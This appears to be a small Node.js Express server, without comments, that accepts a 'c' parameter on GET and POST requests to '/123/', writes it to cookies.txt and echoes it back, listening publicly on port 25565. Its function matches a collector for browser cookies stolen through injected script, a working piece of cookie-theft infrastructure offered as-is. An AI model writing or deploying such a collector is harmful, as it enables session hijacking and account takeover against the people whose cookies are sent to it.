const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));

app.post('/123/', (req, res) => {
    const cookies = req.body.c;
    if (cookies) {
        fs.writeFileSync('cookies.txt', cookies);
        res.status(200).send(`Cookies received and saved to cookies.txt: ${cookies}`);
    } else {
        res.status(400).send('Bad Request');
    }
});

app.get('/123/', (req, res) => {
    const cookies = req.query.c;
    if (cookies) {
        fs.writeFileSync('cookies.txt', cookies);
        res.status(200).send(`Cookies received and saved to cookies.txt: ${cookies}`);
    } else {
        res.status(400).send('Bad Request');
    }
});

app.listen(25565, '0.0.0.0', () => {
    console.log('Server running at http://0.0.0.0:25565/');
});
